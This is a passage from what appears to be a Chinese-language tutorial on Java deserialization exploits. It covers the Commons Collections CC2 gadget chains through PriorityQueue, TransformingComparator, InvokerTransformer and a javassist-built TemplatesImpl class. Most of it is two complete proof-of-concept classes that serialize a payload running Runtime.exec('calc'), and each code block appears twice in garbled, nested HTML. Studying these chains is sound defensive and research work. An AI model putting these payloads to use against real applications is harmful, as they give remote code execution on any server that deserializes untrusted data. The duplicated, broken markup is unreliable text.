class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>></span><br></code></pre></td></tr></table></figure>

<p>CC2 有两个POC，这两个POC都是利用PriorityQueue的readObject，区别在于后半段的触发transfomer，POC1用的<code>TransformingComparator.compare</code>，而POC2用的<code>InvokerTransformer.transfomer</code> 去调用<code>TemplateImpl.newTransformer</code>方法创建一个新的类 </p>
<p>先看PriorityQueue的readObject如何利用TransformingComparator触发transfomer:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PriorityQueue</span>&lt;<span class="hljs-title">E</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractQueue</span>&lt;<span class="hljs-title">E</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>	<br>  	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">7720805057305804111L</span>;<br>		<span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Reconstitutes the &#123;<span class="hljs-doctag">@code</span> PriorityQueue&#125; instance from a stream</span><br><span class="hljs-comment">     * (that is, deserializes it).</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> s the stream</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        queue = <span class="hljs-keyword">new</span> Object[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<br>    &#125;<br>  <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Establishes the heap invariant (described above) in the entire tree,</span><br><span class="hljs-comment">     * assuming nothing about the order of the elements prior to the call.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>	<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Inserts item x at position k, maintaining heap invariant by</span><br><span class="hljs-comment">     * demoting x down the tree repeatedly until it is less than or</span><br><span class="hljs-comment">     * equal to its children or is a leaf.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> k the position to fill</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> x the item to insert</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>            siftDownUsingComparator(k, x);<br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br>	<br>	<br>		<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PriorityQueue</span>&lt;<span class="hljs-title">E</span>&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title">AbstractQueue</span>&lt;<span class="hljs-title">E</span>&gt;</span><br><span class="hljs-class">    <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br>	<br>  	<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">long</span> serialVersionUID = -<span class="hljs-number">7720805057305804111L</span>;<br>		<span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Reconstitutes the &#123;<span class="hljs-doctag">@code</span> PriorityQueue&#125; instance from a stream</span><br><span class="hljs-comment">     * (that is, deserializes it).</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> s the stream</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;<br>        <span class="hljs-comment">// Read in size, and any hidden stuff</span><br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Read in (and discard) array length</span><br>        s.readInt();<br><br>        queue = <span class="hljs-keyword">new</span> Object[size];<br><br>        <span class="hljs-comment">// Read in all elements.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            queue[i] = s.readObject();<br><br>        <span class="hljs-comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span><br>        <span class="hljs-comment">// spec has never explained what that might be.</span><br>        heapify();<br>    &#125;<br>  <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Establishes the heap invariant (described above) in the entire tree,</span><br><span class="hljs-comment">     * assuming nothing about the order of the elements prior to the call.</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">heapify</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>	<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Inserts item x at position k, maintaining heap invariant by</span><br><span class="hljs-comment">     * demoting x down the tree repeatedly until it is less than or</span><br><span class="hljs-comment">     * equal to its children or is a leaf.</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> k the position to fill</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> x the item to insert</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDown</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (comparator != <span class="hljs-keyword">null</span>)<br>            siftDownUsingComparator(k, x);<br>        <span class="hljs-keyword">else</span><br>            siftDownComparable(k, x);<br>    &#125;<br>	<br>	<br>		<span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">siftDownUsingComparator</span><span class="hljs-params">(<span class="hljs-keyword">int</span> k, E x)</span> </span>&#123;<br>        <span class="hljs-keyword">int</span> half = size &gt;&gt;&gt; <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (k &lt; half) &#123;<br>            <span class="hljs-keyword">int</span> child = (k &lt;&lt; <span class="hljs-number">1</span>) + <span class="hljs-number">1</span>;<br>            Object c = queue[child];<br>            <span class="hljs-keyword">int</span> right = child + <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (right &lt; size &amp;&amp;<br>                comparator.compare((E) c, (E) queue[right]) &gt; <span class="hljs-number">0</span>)<br>                c = queue[child = right];<br>            <span class="hljs-keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="hljs-number">0</span>)<br>                <span class="hljs-keyword">break</span>;<br>            queue[k] = c;<br>            k = child;<br>        &#125;<br>        queue[k] = x;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>PriorityQueue的<code>readObject -&gt; heapify -&gt; siftDown -&gt; siftDownUsingComparator</code> 会调用<code>Comparator.compare</code>，而<code>TransformingComparator.compare</code>方法可以执行transfomer，这就是POC1</p>
<p>POC1:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre class=" language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>        &#125;;<br><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// 反射修改comparator</span><br>        Field comparator = priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(priorityQueue, transformingComparator);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string"><code class="language-hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2_1</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        String cmd = <span class="hljs-string">&quot;calc&quot;</span>;<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;<br>                        Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>]&#125;<br>                ),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;cmd&#125;)<br>        &#125;;<br><br><br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(transformers);<br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chainedTransformer);<br><br>        PriorityQueue priorityQueue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        priorityQueue.add(<span class="hljs-number">1</span>);<br>        priorityQueue.add(<span class="hljs-number">2</span>);<br><br>        <span class="hljs-comment">// 反射修改comparator</span><br>        Field comparator = priorityQueue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        comparator.setAccessible(<span class="hljs-keyword">true</span>);<br>        comparator.set(priorityQueue, transformingComparator);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(priorityQueue);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"serialize.ser"</span>));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>POC2在POC1的基础上，利用TransformingComparator.compare执行InvokerTransformer，而InvokerTransformer传入的方法为tamplateImpl.newTransform，从而创建一个恶意类。</p>
<p>POC2:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre class=" language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2_2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// 需要反射的两个类</span><br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        <span class="hljs-comment">// 这里需要借助javassist中的相关方法，动态创建类，动态添加类方法和静态代码块</span><br>        ClassPool classPool = ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload = classPool.makeClass(<span class="hljs-string">&quot;CC2&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>			 payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-comment">// 用来保存字节码</span><br>        <span class="hljs-keyword">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 反射创建TemplatesImpl类实例</span><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> Class[]&#123;&#125;).newInstance();<br>        <span class="hljs-comment">// 反射修改其中的_bytecodes属性</span><br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br><br>        <span class="hljs-comment">// 反射修改其中的_name属性</span><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-keyword">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// 创建InvokerTransformer实例，并写好newTransfomer方法调用</span><br>        InvokerTransformer transformer=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;,<span class="hljs-keyword">new</span> Object[]&#123;&#125;);<br>        <span class="hljs-comment">// 创建TransformingComparator实例，放在后面的PriorityQueue中</span><br>        TransformingComparator comparator=<span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 反射修改PriorityQueue中的comparator变量，反序列化后，会自动调用comparator.compare方法</span><br>        Field field2=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field2.setAccessible(<span class="hljs-keyword">true</span>);<br>        field2.set(queue,comparator);<br><br>        <span class="hljs-comment">// 修改PriorityQueue中的queue变量，因为反序列化后，queue中的对象会传入comparator.compare方法中，</span><br>        <span class="hljs-comment">// 然后调用到templatesImpl.newTransform</span><br>        Field field3=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        field3.setAccessible(<span class="hljs-keyword">true</span>);<br>        field3.set(queue,<span class="hljs-keyword">new</span> Object[]&#123;templatesImpl,templatesImpl&#125;);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(queue);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string"><code class="language-hljs java"><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC2_2</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <span class="hljs-comment">// 需要反射的两个类</span><br>        String AbstractTranslet=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;</span>;<br>        String TemplatesImpl=<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br><br>        <span class="hljs-comment">// 这里需要借助javassist中的相关方法，动态创建类，动态添加类方法和静态代码块</span><br>        ClassPool classPool = ClassPool.getDefault();<br>        classPool.appendClassPath(AbstractTranslet);<br>        CtClass payload = classPool.makeClass(<span class="hljs-string">&quot;CC2&quot;</span>);<br>        payload.setSuperclass(classPool.get(AbstractTranslet));<br>			 payload.makeClassInitializer().setBody(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br><br>        <span class="hljs-comment">// 用来保存字节码</span><br>        <span class="hljs-keyword">byte</span>[] bytes = payload.toBytecode();<br><br>        <span class="hljs-comment">// 反射创建TemplatesImpl类实例</span><br>        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(<span class="hljs-keyword">new</span> Class[]&#123;&#125;).newInstance();<br>        <span class="hljs-comment">// 反射修改其中的_bytecodes属性</span><br>        Field field=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        field.set(templatesImpl,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br><br>        <span class="hljs-comment">// 反射修改其中的_name属性</span><br>        Field field1=templatesImpl.getClass().getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        field1.setAccessible(<span class="hljs-keyword">true</span>);<br>        field1.set(templatesImpl,<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-comment">// 创建InvokerTransformer实例，并写好newTransfomer方法调用</span><br>        InvokerTransformer transformer=<span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-keyword">new</span> Class[]&#123;&#125;,<span class="hljs-keyword">new</span> Object[]&#123;&#125;);<br>        <span class="hljs-comment">// 创建TransformingComparator实例，放在后面的PriorityQueue中</span><br>        TransformingComparator comparator=<span class="hljs-keyword">new</span> TransformingComparator(transformer);<br>        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">2</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-comment">// 反射修改PriorityQueue中的comparator变量，反序列化后，会自动调用comparator.compare方法</span><br>        Field field2=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>        field2.setAccessible(<span class="hljs-keyword">true</span>);<br>        field2.set(queue,comparator);<br><br>        <span class="hljs-comment">// 修改PriorityQueue中的queue变量，因为反序列化后，queue中的对象会传入comparator.compare方法中，</span><br>        <span class="hljs-comment">// 然后调用到templatesImpl.newTransform</span><br>        Field field3=queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>        field3.setAccessible(<span class="hljs-keyword">true</span>);<br>        field3.set(queue,<span class="hljs-keyword">new</span> Object[]&#123;templatesImpl,templatesImpl&#125;);<br><br>        <span class="hljs-comment">// 模拟序列化和反序列化</span><br>        ObjectOutputStream outputStream = <span class="hljs-keyword">new</span> ObjectOutputStream(<span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">&quot;serialize.ser&quot;</span>));<br>        outputStream.writeObject(queue);<br>        outputStream.close();<br><br>        ObjectInputStream inputStream=<span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-string">"serialize.ser"</span>));<br>        inputStream.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<h2 id="0x3-3-Commons-Collections3"><a href="#0x3-3-Commons-Collections3" class="headerlink" title="0x3.3 Commons Collections3"></a>0x3.3 Commons Collections3</h2><p>限制：</p>
<ul>
<li>JDK 1.7</li>
<li>Commons Collections 3.1</li>
<li>javassist</li>
</ul>
<p>CC3 利用TrAXFilter的构造方法传入的TemplateImpl可以构造出一个静态恶意类，后面触发就是CC1了。</p>
